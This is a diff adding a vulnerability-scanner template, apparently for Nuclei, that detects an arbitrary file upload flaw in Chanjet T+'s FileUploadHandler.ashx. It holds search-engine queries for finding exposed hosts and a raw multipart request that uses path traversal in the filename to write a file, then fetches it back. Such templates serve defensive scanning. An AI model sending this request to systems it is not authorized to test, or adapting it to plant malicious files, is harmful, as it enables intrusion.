@@ -1,0 +1,56 @@
+id: changjet-tplus-FileUploadHandler-fileupload
+info:
+  name: 畅捷通 T+ FileUploadHandler.ashx - 任意文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: todo
+  reference:
+    - todo
+  metadata:
+    verified: true
+    hunter-query: app.name="畅捷通 T+"
+    fofa-query: icon_hash="-2067519629" || app="畅捷通-TPlus"
+  tags: changjet,tplus,fileupload
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /tplus/SM/SetupAccount/FileUploadHandler.ashx?login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywmskorxe
+        Content-Length: 448
+
+        ------WebKitFormBoundarywmskorxe
+        Content-Disposition: form-data; name="appid"
+
+
+        ------WebKitFormBoundarywmskorxe
+        Content-Disposition: form-data; name="path"
+
+
+        ------WebKitFormBoundarywmskorxe
+        Content-Disposition: form-data; name="fname"
+
+
+        ------WebKitFormBoundarywmskorxe
+        Content-Disposition: form-data; name="file"; filename="../img/login/{{filename}}.jpg"
+        Content-Type: image/jpeg
+
+        {{randstr}}
+        ------WebKitFormBoundarywmskorxe--
+
+      - |-
+        GET /tplus/img/login/{{filename}}.jpg HTTP/1.1
+        Host: {{Hostname}}
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 ==200 && status_code_2 == 200"
+          - "contains(body_2,'{{randstr}}')"
+        condition: and
